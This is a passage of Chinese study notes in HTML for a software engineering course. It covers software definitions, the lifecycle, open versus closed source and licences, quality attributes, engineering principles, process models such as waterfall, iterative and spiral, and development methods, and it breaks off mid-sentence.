tabindex="-1">（4）软件测试技术</h4><ul><li>程序本质上是对数据的处理</li><li>设计数据(测试用例) -&gt; 运行测试用例(程序来处理数据) -&gt; 判断运行结果(是否符合预期结果)</li></ul><h3 id="4-%E4%BD%95%E4%B8%BA%E8%BD%AF%E4%BB%B6%E5%8F%8A%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%89%B9%E7%82%B9" tabindex="-1">4 何为软件及软件的特点</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BD%95%E4%B8%BA%E8%BD%AF%E4%BB%B6" tabindex="-1">（1）何为软件</h4><ul><li>软件是指在计算机系统的支持下，能够完成特定功能与性能的<strong>程序、数据和文档</strong><ul><li>文档：记录软件开发活动和阶段性成果、软件配置及变更的阐述性资料<ul><li>定义和理解软件</li><li>记录软件开发成果</li><li>辅助不同人员间的交流</li></ul></li><li>数据：程序的加工处理对象和结果<ul><li>数据形式：用户，订单，交易，日志</li><li>数据处理：表示，获取，存储，检索，分析</li></ul></li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E6%A6%82%E5%BF%B5%E7%BB%99%E6%88%91%E4%BB%AC%E7%9A%84%E5%90%AF%E7%A4%BA" tabindex="-1">（2）软件概念给我们的启示</h4><ul><li>软件<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≠</mo><mrow></mrow></mrow><annotation encoding="application/x-tex">\not ={}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0em;"></span><span class="mord"></span></span></span></span></eq>程序<ul><li>软件涉及更多制品</li><li>这些制品间有关联、相互依赖</li></ul></li><li>开发软件   <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≠</mo><mrow></mrow></mrow><annotation encoding="application/x-tex">\not ={}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0em;"></span><span class="mord"></span></span></span></span></eq>      编写程序<ul><li>软件开发需要做更多事情</li><li>对软件提出更高的要求</li></ul></li><li>软件的规模和复杂性意味着要采用行之有效的方法—工程方法</li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F" tabindex="-1">（3）软件生命周期</h4><ul><li>a 需求分析</li><li>b 软件设计</li><li>c 编码实现</li><li>d 软件测试</li><li>e 部署运行</li><li>f 使用维护</li><li>转a</li></ul><h4 id="%EF%BC%884%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%89%B9%E7%82%B9" tabindex="-1">（4）软件特点</h4><ul><li>逻辑性：逻辑产品，逻辑思维（非物理活动）的结果、不会磨损和老化</li><li>设计开发：是设计开发而成的，不是生产制造而成的，而是一系列以设计为核心的软件开发活动</li><li>易变性：需求经常变、难以把控，影响软件的制品即开发过程；产品难以成熟</li><li>复杂性：规模大；运行复杂；环境复杂；</li><li>缺陷的隐蔽性：缺陷隐藏在逻辑代码中，不像硬件系统那样直观显现，很难被人们所发现和排除</li></ul><h3 id="5-%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%88%86%E7%B1%BB" tabindex="-1">5 软件的分类</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%88%86%E7%B1%BB" tabindex="-1">（1）软件的分类</h4><ul><li><p>应用软件</p><ul><li>面向特定应用领域的专用软件。它们针对相关行业和领域的特定问题，为其提供基于计算的新颖解决方案。</li><li>示例：淘宝、12306、携程、微信、QQ等软件</li></ul></li><li><p>系统软件</p><ul><li>对计算机资源进行管理，为应用软件的运行提供基础设施和服务的一类软件。从计算服务的视角，系统软件介于计算机硬件和应用软件之间。</li><li>示例：操作系统、数据库管理系统、编译软件、软件中间件等</li></ul></li><li><p>支撑软件</p><ul><li>辅助软件开发和运维，帮助开发人员完成软件开发和维护工作的一类软件</li><li>示例：SonarQube、Visual Studio、Eclipse等</li></ul></li><li><p>通用软件产品</p><ul><li>由软件开发组织开发的，在市场上公开销售，可以独立使用的软件.</li><li>关于产品应该做什么的规格说明由开发者确定，相关的变更决策也由开发者做出.</li></ul></li><li><p>定制化软件产品</p><ul><li>受特定客户委托，由软件开发商针对特定客户需求专门设计和实现的软件.</li><li>关于产品应该做什么的规格说明由客户给出，相关的变更需求也由客户提出.</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E9%97%AD%E6%BA%90%E8%BD%AF%E4%BB%B6" tabindex="-1">（2）闭源软件</h4><ul><li>何为闭源软件<ul><li>软件代码不对用户开放的一类软件，购买软件时只提供可运行软件或服务，没有提供源代码</li><li>以许可证（License）的方式授权用户使用软件</li></ul></li><li>闭源软件带来的问题<ul><li>无法掌握软件内部实现情况（如是否存在安全漏洞和恶意代码），也无法对软件进行修改和完善，极大影响了开发者的创新自由</li></ul></li><li>示例<ul><li>微软的Windows、Office软件，</li><li>典型企业：微软、IBM、Oracle等</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6" tabindex="-1">（3）开源软件</h4><ul><li>何为开源软件<ul><li>一种源代码可以自由获取和传播的计算机软件，其拥有者通过开源许可证赋予被许可人对软件进行使用、修改和传播</li></ul></li><li>开源软件的好处<ul><li>源代码可自由传播</li><li>激发创作者的热情</li><li>免费使用降低成本</li></ul></li><li>示例：开源软件<ul><li>Linux, Ubuntu</li><li>Apache, Jboss, Tomcat</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E6%89%98%E7%AE%A1%E5%B9%B3%E5%8F%B0" tabindex="-1">（4）开源软件托管平台</h4><ul><li>Github：全球最有影响力的开源软件托管平台</li><li>SourceForge：一个有影响力的开源软件开发平台和仓库，为开源软件提供存储、协作和发布的支持</li><li>Gitee：中国的开源软件托管平台</li><li>Stack Overflow：全球最大的软件开发知识分享平台，它支持开发者交流和讨论软件开发问题、分享软件开发经验和知识，进而促进相关开发问题的解决，推动开源软件的开发</li></ul><h4 id="%EF%BC%885%EF%BC%89%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BC%98%E5%8A%BF" tabindex="-1">（5）开源软件的优势</h4><ul><li><p>采购和开发的成本更低</p><ul><li>开源软件通常是免费的，即使要付费，其费用也非常低廉</li></ul></li><li><p>软件质量更高、更安全</p><ul><li>核心代码都在公众的视野之中，代码问题（如缺陷、安全漏洞等）很容易被人发现</li></ul></li><li><p>软件研制和交付的更快</p><ul><li>基于开源软件的项目开发可以更为快速地给用户交付软件产品</li></ul></li><li><p>软件功能更为强大</p><ul><li>大量的软件开发者不仅参与软件开发，贡献他们的代码，而且还参与软件的创新，提出和构思软件需求，不断完善软件功能</li></ul></li><li><p>开源软件许可证</p><ul><li>何为开源许可证<ul><li>声明获得开源代码后拥有的权利，界定对别人的开源作品进行何种操作、何种操作是被禁止的，规范开源软件的使用要求和约束</li><li>开发者虽然可自由地获取开源软件的源代码，但在如何使用开源软件方面还需要遵循相关的开源软件协议</li></ul></li><li>二类许可证<ul><li>宽松式开源许可证：三方面特点：代码使用没有任何限制；用户自担代码质量的风险；用户使用开源软件时须披露原始作者</li><li>Copyleft式开源许可证：更多限制，带有许多条件和要求，比如分发二进制代码时须提供源代码，修改后的开源软件须与之前保持一致的许可证等</li></ul></li></ul></li></ul><h4 id="%EF%BC%886%EF%BC%89%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8" tabindex="-1">（6）开源软件的利用</h4><ul><li>学习开源软件<ul><li>不仅反映了核心开发者的软件技术和功能创意，而且还蕴含了高水平的软件开发技能，如架构设计、编码风格、模块封装等</li></ul></li><li>重用开源代码<ul><li>开源软件构成了支撑软件开发的可重用软件资源库，可实现更大粒度的软件重用</li></ul></li><li>参与开源建设，掌握开源技术，理解开源文化<ul><li>包括反馈软件缺陷、提出软件需求、讨论问题的解决、贡献程序代码等等</li></ul></li><li>重用和集成开源软件来快速搭建高质量的系统</li></ul><h3 id="6-%E8%BD%AF%E4%BB%B6%E8%B4%A8%E9%87%8F" tabindex="-1">6 软件质量</h3><ul><li>软件质量是指软件满足给定需求的程度，它是产品生命线</li><li>正确性（Correctness）：软件满足规格说明和用户要求的程度，即在预定环境下能正确地完成预期功能和非功能需求的程度。</li><li>可靠性（Reliability）：在规定条件下、限定时间范围内，软件系统完成预期功能、不引起系统故障的能力。</li><li>健壮性（Robustness）：在计算环境发生故障、输入无效数据或操作错误等意外情况下，软件仍能做出适当响应的程度。</li><li>有效性（Efficiency）：软件利用计算资源和存储资源以实现其功能的能力</li><li>安全性：包括系统安全（Safety）和信息安全（Security），系统安全是指软件能及时有效地避免给人员、设施、环境、经济等造成损害，信息安全是指软件能有效防控各类的非法获取、传播和使用</li><li>可维护性（Maintainability）：是否易于对其进行修改以更正错误、增强功能、适应新运行环境</li><li>可移植性（Portability）：把软件从一种运行环境转移到另一种运行环境下运行的难易程度</li><li>可重用性（Reusability）：软件模块、构件、设计方案等在其他软件开发中被再次使用程度</li><li>可理解性（Comprehensibility）：软件开发者或用户理解该软件系统的容易程度</li><li>可信性（Dependability）：采取有效措施确认软件满足人们的要求和期望</li><li>持续性（Sustainability）：面对各种突发异常事件，仍能提供令人满意的服务的能力</li><li>可用性（Usability）：使用和操作软件系统难以程度</li><li>互操作性（Interoperability）：软件系统与其他的系统进行交换信息、协同工作的能力</li></ul><h2 id="%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%BF%B0" tabindex="-1">第二章 软件工程概述</h2><h3 id="1-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%BA%A7%E7%94%9F%E8%83%8C%E6%99%AF" tabindex="-1">1 软件工程产生背景</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%8D%B1%E6%9C%BA%E7%9A%84%E5%87%BA%E7%8E%B0" tabindex="-1">（1）软件危机的出现</h4><ul><li>进度经常延迟</li><li>质量无法保证</li><li>成本超出预算</li><li>软件维护困难</li><li>失败风险很大</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%A6%82%E4%BD%95%E6%9D%A5%E8%A7%A3%E5%86%B3%E8%BD%AF%E4%BB%B6%E5%8D%B1%E6%9C%BA%3F" tabindex="-1">（2）如何来解决软件危机?</h4><ul><li>软件危机根源<ul><li>对软件这样一类复杂和特殊系统的认识不清：软件是新生事物，对其特点、规律性和复杂性认识不够</li><li>没有找到支持软件系统开发的有效方法：基础理论、关键技术、开发过程、支撑工具等</li><li>缺乏成功软件开发实践以及相应的开发经验：系统总结、认真分析、充分借鉴、吸取教训</li></ul></li><li>软件开发迫切需要理论和方法指导，软件工程应运而生</li></ul><h3 id="2-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E5%86%85%E6%B6%B5" tabindex="-1">2 软件工程基本内涵</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BD%95%E4%B8%BA%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B" tabindex="-1">（1）何为软件工程</h4><ul><li><p>将系统的、规范的、可量化的方法应用于软件的开发、运行和维护的过程；以及上述方法的研究</p><ul><li>系统化：提供完整和全面的解决方法，包括目标、原则、过程模型、开发活动、开发方法和技术等</li><li>规范化：支持各类软件系统的开发，包括语言标准、质量标准、编程标准、方法标准、能力极其改进标准等</li><li>可量化：工作量、成本、进度、质量等要素可以量化，基于定量的数据支持开发和管理，确保科学性和可行性</li></ul></li><li><p>软件工程对软件开发的新认识</p><ul><li>软件是产品(Product)：面向用户，存在质量、成本、利润等特征</li><li>软件开发是一项工程(Project)：存在约束，需要质量保证，进行组织管理，…</li><li>要按工程化方法来组织软件生产<ul><li>分阶段分步骤来实施</li><li>按计划开展开发活动</li><li>进行各种形式质量保证</li><li>采用行之有效的方法</li><li>借助各种工具的支持…</li></ul></li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B8%89%E8%A6%81%E7%B4%A0" tabindex="-1">（2）软件工程三要素</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/2_3_0.jpg" alt></p><ul><li>过程<ul><li>从管理的视角，回答软件开发、运行和维护需要开展哪些工作、按照什么样的步骤和次序来开展工作</li><li>对软件开发过程所涉及的人、制品、质量、成本、计划等进行有效和可量化的管理</li><li>典型成果<ul><li>过程模型，如瀑布模型、增量模型、原型模型、迭代模型、螺旋模型等等</li><li>方法，如敏捷开发方法、群体化开发方法、DevOps方法</li><li>管理，如配置管理、质量管理、团队组织等</li></ul></li></ul></li><li>方法学(Methodology)<ul><li>从技术的视角，回答软件开发、运行和维护如何做的问题</li><li>为软件开发过程中的各项开发和维护活动提供系统性、规范性的技术支持<ul><li>如何理解和认识软件模型是什么</li><li>如何用不同抽象层次的模型来描述软件制品</li><li>采用什么样的建模语言来描述软件模型等等</li></ul></li><li>典型成果<ul><li>结构化软件开发方法学</li><li>面向对象软件开发方法学</li><li>基于构件的软件开发方法学</li></ul></li></ul></li><li>工具<ul><li>从工具辅助的视角，主要回答如何借助工具来辅助软件开发、运行和维护的问题</li><li>帮助软件开发人员更为高效地运用软件开发方法学来完成软件开发过程中的各项工作，提高软件开发效率和质量，加快软件交付进度。<ul><li>如需求分析、软件设计、编码实现、软件测试、部署运行、软件维护、项目管理、质量保证等，简化软件开发任务，</li></ul></li><li>典型成果：SonarQube、Eclipse等</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BE%85%E5%8A%A9%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B" tabindex="-1">（3）计算机辅助软件工程</h4><ul><li>什么是计算机辅助软件工程(Computer-Aided Software Engineering, CASE)<ul><li>在软件工程活动中，开发人员按照软件工程的方法和原则，借助于计算机及其软件的帮助来开发、维护和管理软件产品的过程</li></ul></li><li>CASE工具：支持CASE的软件工具，如编辑器、编译器等</li><li>CASE环境：<ul><li>将CASE工具按统一标准和接口组装起来，使工具间、人员间、各个过程间能方便交互的集成环境</li><li>如Visual Studio将编辑、编译、调试、界面设计、安装程序生成等等集成在一起</li></ul></li><li>代码编写，项目管理，软件建模，软件测试，软件运维</li></ul><h4 id="%EF%BC%884%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E7%9A%84%E6%9C%AC%E8%B4%A8" tabindex="-1">（4）软件开发的本质</h4><ul><li>软件开发 = 软件创作 + 软件生产</li><li>软件创作：基于软件开发者的经验和技能，借助于智慧，进行自由创新，如软件设计、编码实现等</li><li>软件生产：基于工程化的手段，遵循约束和规范，开展软件生产，如遵循过程、按照标准、质量保证等</li></ul><h4 id="%EF%BC%885%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%9A%84%E7%9B%AE%E6%A0%87" tabindex="-1">（5）软件工程的目标</h4><p>在成本、进度等约束下，指导软件开发和运维，开发出满足用户要求的足够好软件</p><h4 id="%EF%BC%886%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%8E%9F%E5%88%99" tabindex="-1">（6）软件工程原则</h4><ul><li>抽象与建模<ul><li>抽象：将与相关开发活动所关注的要素提取出来，不关心的要素扔掉，形成与该开发活动相关的软件要素</li><li>建模：基于特定的抽象，借助于建模语言（如数据流图、UML等），建立起基于这些抽象的软件模型，进而促进对软件系统的准确理解</li></ul></li><li>模块化<ul><li>将软件系统的功能分解和实现为若干个模块，每个模块具有独立的功能，模块之间通过接口进行调用和访问。</li></ul></li><li>软件重用<ul><li>在软件开发过程中尽可能利用已有的软件资源和资产（如函数库、类库、构件库、开源软件、代码片段等）来实现软件系统</li><li>努力开发出可被再次重用的软件资源（如函数、类、构件等）</li><li>有助于提高软件开发效率，降低软件开发成本，满足开发工程约束，得到高质量的软件产品</li></ul></li><li>信息隐藏<ul><li>模块内部信息（如内部的语句、变量等）对外不可见或不可访问，模块间仅仅交换那些为完成系统功能所必需交换的信息（如接口）</li><li>模块设计时只对外提供可见的接口，不提供内部实现细节。信息隐藏原则可提升模块的独立性，减少错误向外传播，支持模块的并行开发</li></ul></li><li>关注点分离</li><li>分而治之</li><li>双向追踪原则<ul><li>当某个软件制品发生变化时，一方面要追踪这种变化会对那些软件制品产生影响，进而指导相关的开发和维护工作，此为正向追踪；另一方面要追踪产生这种变化的来源，或者说是什么因素导致了该软件制品的变化，明确软件制品发生变化的原因及其合理性，此为反向追踪。</li></ul></li><li>工具辅助</li></ul><h2 id="%E7%AC%AC%E4%B8%89%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%92%8C%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95" tabindex="-1">第三章 软件工程和开发方法</h2><h3 id="1-%E4%BD%95%E4%B8%BA%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B" tabindex="-1">1 何为软件过程模型</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B" tabindex="-1">（1）软件过程</h4><ul><li>过程(Process)<ul><li>活动：明确要做哪些事情，包括具体的活动</li><li>关系：活动间存在逻辑关系，如依赖和先后次序</li></ul></li><li>软件过程：<ul><li>按照项目进度、成本和质量要求，遵循用户需求，开发和维护软件、管理软件项目的一系列有序软件开发活动</li><li>软件开发活动：技术活动和管理活动</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B" tabindex="-1">（2）软件过程模型</h4><ul><li>定义了软件开发的具体活动以及活动间的逻辑关系</li><li>描述包括：<ul><li>过程中的活动以及这些活动的顺序</li><li>产品交付物：软件过程活动的产出物;</li><li>角色：反映了参与过程的人在其中的职责;</li><li>前置条件和后置条件：在一个过程活动执行之前和之后，或者产品生产之前和之后必须满足的条件。</li><li>工具</li><li>资源</li></ul></li></ul><h3 id="2-%E6%9C%89%E5%93%AA%E4%BA%9B%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B" tabindex="-1">2 有哪些软件过程模型</h3><ul><li>瀑布模型</li><li>增量模型</li><li>迭代模型</li><li>原型模型</li><li>螺旋模型</li><li>基于构件的过程模型</li><li>UP模型</li></ul><h4 id="%EF%BC%881%EF%BC%89%E7%80%91%E5%B8%83%E6%A8%A1%E5%9E%8B" tabindex="-1">（1）瀑布模型</h4><ul><li>步骤<ol><li><strong>需求分析</strong></li></ol><ul><li>活动<ul><li>任务：定义软件需求，包括功能、非功能需求</li><li>层次和视角：用户角度，仅描述问题和需求</li></ul></li><li>方法<ul><li>依据：用户的期望和要求</li><li>不断与用户进行交流和商讨，抽象、问题分解、多视点等技术</li></ul></li><li>产出：软件需求模型；软件需求文档；软件确认测试计划；</li></ul><ol start="2"><li><strong>概要设计</strong></li></ol><ul><li>活动<ul><li>任务：建立软件总体架构、制定集成测试计划</li><li>层次和视角：宏观、全局、整体、战略性</li></ul></li><li>方法<ul><li>依据：软件需求文档</li><li>自顶向下, 逐步求精,  抽象, 模块化, 局部化，信息隐藏</li></ul></li><li>产出：软件概要设计模型、软件概要设计文档、软件集成测试计划</li></ul><ol start="3"><li><strong>详细设计</strong></li></ol><ul><li>活动<ul><li>任务：设计模块内部细节(算法、数据结构)，制订单元测试计划</li><li>层次和视角：微观、局部、细节性</li></ul></li><li>方法<ul><li>依据：概要设计文档、软件需求文档</li><li>高质量的软件设计原则，如单入口单出口</li></ul></li><li>产出：软件详细设计模型、软件详细设计文档、单元测试计划</li></ul><ol start="4"><li><strong>编码实现</strong></li></ol><ul><li>活动<ul><li>任务：编写程序代码并进行单元测试和调试</li><li>层次和视角：最终的实现代码</li></ul></li><li>方法<ul><li>依据：软件概要和详细设计文档、单元测试计划</li><li>采用某种程序设计语言(如C、C++、Java)</li></ul></li><li>产出：经过单元测试的源程序代码</li></ul><ol start="5"><li><strong>集成测试</strong></li></ol><ul><li>活动<ul><li>任务：组装软件模块并进行测试以发现问题</li><li>层次和视角：系统结构、接口</li></ul></li><li>方法<ul><li>依据：软件概要设计文档、软件集成测试计划</li><li>软件集成测试工具</li></ul></li><li>产出：经过集成测试、修复缺陷的源程序代码，集成测试报告</li></ul><ol start="6"><li><strong>确认测试</strong></li></ol><ul><li>活动<ul><li>任务：测试软件是否满足用户需求</li><li>层次和视角：从用户角度，聚焦需求是否得以正确实现</li></ul></li><li>方法<ul><li>依据：软件确认测试计划、软件需求文档</li><li>软件测试支撑工具</li></ul></li><li>产出：经过确认测试、修复缺陷后的代码，软件确认测试报告</li></ul></li><li>特点：<ul><li>与软件生命周期相互一致</li><li>每个活动结束后需要评审</li><li>相邻活动间存在因果关系</li></ul></li><li>优点：简单，一目了然，易理解、掌握、应用和管理</li><li>缺点：违背现实</li><li>适用于需求易于定义、不易变动的软件系统</li><li>改进的瀑布模型：带反馈和回溯</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%A2%9E%E9%87%8F%E6%A8%A1%E5%9E%8B" tabindex="-1">（2）增量模型</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_4.jpg" alt></p><ul><li>优点：渐进快速交付，并行开发，提高效率</li><li>不足：<ul><li>要求一开始完整确定需求，建立系统架构的要求更高</li><li>管理复杂，增量开发，要保持多个版本的制品一致性</li><li>产品是慢慢成熟的，跟办事规程不匹配</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BF%AD%E4%BB%A3%E6%A8%A1%E5%9E%8B(iterative-model)" tabindex="-1">（3）迭代模型(Iterative Model)</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_5.jpg" alt></p><ul><li>优点：<ul><li>每次迭代是一完整过程</li><li>体现了小步快跑的开发理念，降低风险</li><li>适合需求难导出、不甚明确且持续变动的软件</li></ul></li><li>不足<ul><li>迭代多少次不确定</li><li>管理较为复杂</li><li>高素质管理者和团队</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%9E%8B(prototype-model)" tabindex="-1">（4）原型模型(Prototype Model)</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_6.jpg" alt></p><ul><li>软件原型:用户界面+执行流程</li><li>特点<ul><li>软件原型作为交流载体和媒介</li><li>支持用户参与到软件开发中</li><li>持续、渐进地导出用户要求</li></ul></li><li>适合于需求难导出、模糊且不易确定的软件</li></ul><h4 id="%EF%BC%885%EF%BC%89%E8%9E%BA%E6%97%8B%E6%A8%A1%E5%9E%8B(spiral-model)" tabindex="-1">（5）螺旋模型(Spiral Model)</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_7.jpg" alt></p><ul><li>优点：<ul><li>集成迭代模型和原型模型</li><li>引入风险分析，风险驱动</li><li>适合于需求不明确、开发风险高、开发过程中需求变更大的内部软件项目</li></ul></li><li>不足：风险驱动、管理复杂</li></ul><h4 id="%EF%BC%886%EF%BC%89%E4%B8%8D%E5%90%8C%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B%E7%9A%84%E7%89%B9%E7%82%B9" tabindex="-1">（6）不同软件过程模型的特点</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_8.jpg" alt></p><h3 id="3-%E5%A6%82%E4%BD%95%E6%9D%A5%E9%80%89%E6%8B%A9%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B" tabindex="-1">3 如何来选择软件过程模型</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B%E7%9A%84%E9%80%89%E6%8B%A9" tabindex="-1">（1）软件过程模型的选择</h4><ul><li><p>考虑软件项目的特点</p></li><li><p>软件开发团队的水平</p></li><li><p>分析软件过程模型特点</p></li><li><p>互联网应用软件的开发过程模型</p><ul><li>特点：软件需求不确定且快速变化</li><li>如：12306 APP软件，微信软件，淘宝软件</li><li>选用瀑布模型不合适，迭代模型较为合适</li></ul></li><li><p>装备软件的开发过程模型</p><ul><li>特点：软件需求确定且较为稳定</li><li>如：飞行控制软件</li><li>可考虑选用瀑布模型，用迭代模型不是很合适</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BC%A0%E7%BB%9F%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B%E7%9A%84%E7%89%B9%E7%82%B9%E5%92%8C%E4%B8%8D%E8%B6%B3" tabindex="-1">（2）传统软件过程模型的特点和不足</h4><ul><li>软件开发和运维的大量工作用于撰写软件文档，而非去编写程序代码</li><li>软件开发过程中会花费大量时间和精力用于软件文档的评审，以确保软件质量</li><li>一旦软件需求发生变化，开发人员需要修改软件需求文档，并据此来调整其他的一系列文档，最后再修改程序代码</li><li>等较长时间才能得到可运行软件系统</li><li><strong>以文档为中心的重型软件开发方法，非常笨重</strong></li></ul><h3 id="4-%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95%E6%A6%82%E8%BF%B0" tabindex="-1">4 软件开发方法概述</h3><ul><li>Parnas方法</li><li>结构化方法</li><li>面向对象方法</li><li>给予构件的开发方法</li><li>敏捷开发方法</li><li>群体化开发方法</li></ul><h4 id="%EF%BC%881%EF%BC%89parnas%E6%96%B9%E6%B3%95" tabindex="-1">（1）Parnas方法</h4><ul><li>出发点：可靠性，可维护性</li><li>策略<ul><li>信息隐蔽：在设计时仅列出将来可能发生变化的因素，并在模块划分时将这些因素局部化</li><li>意外故障处理：软件的非连续性，小错误会引发严重的事故，所以必须加强防范</li></ul></li><li>特点：Parnas对软件开发提出了深刻的见解，但没有明确的流程，不能独立使用</li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%BB%93%E6%9E%84%E5%8C%96%E6%96%B9%E6%B3%95" tabindex="-1">（2）结构化方法</h4><ul><li>出发点：清晰的程序结构，可理解性。</li><li>求解复杂问题的一般办法：分而治之（模块化）</li><li>策略：模块化，自顶向下、逐步求精；SA+SD+SP（系统分析（System Analysis），系统设计（System Design），软件编程（Software Programming））</li><li>程序=数据+算法，分为：<ul><li>面向数据流的结构化方法</li><li>面向数据结构的结构化方法</li></ul></li><li>特点：<ul><li>数据和行为分开——鸿沟</li><li>难开发、难理解、不安全、可维护性低</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">（3）面向对象的方法</h4><ul><li>出发点：对问题领域的实体特征直接自然模拟，更易于理解和开发，结构更稳定。<ul><li>程序=对象+消息</li></ul></li><li>策略：<ul><li>通过一组对象的交互来完成系统的功能，对象是领域实体的软件抽象</li><li>OOA+OOD+OOP 面向对象分析（Object-Oriented Analysis）、面向对象设计（Object-Oriented Design）和面向对象编程（Object-Oriented Programming）</li><li>自顶向下和自底向上相结合</li></ul></li><li>特点：<ul><li>对象把数据和操作封装在一起</li><li>更稳定、更安全、提高了可维护性和可重用性</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%9E%84%E4%BB%B6%E7%9A%84%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95" tabindex="-1">（4）基于构件的开发方法</h4><ul><li>出发点：提高软件开发效率和质量的基本途径是复用，用大块编程取代，程序=构件+连接件</li><li>策略：<ul><li>有目的地开发可复用的构件（develop for 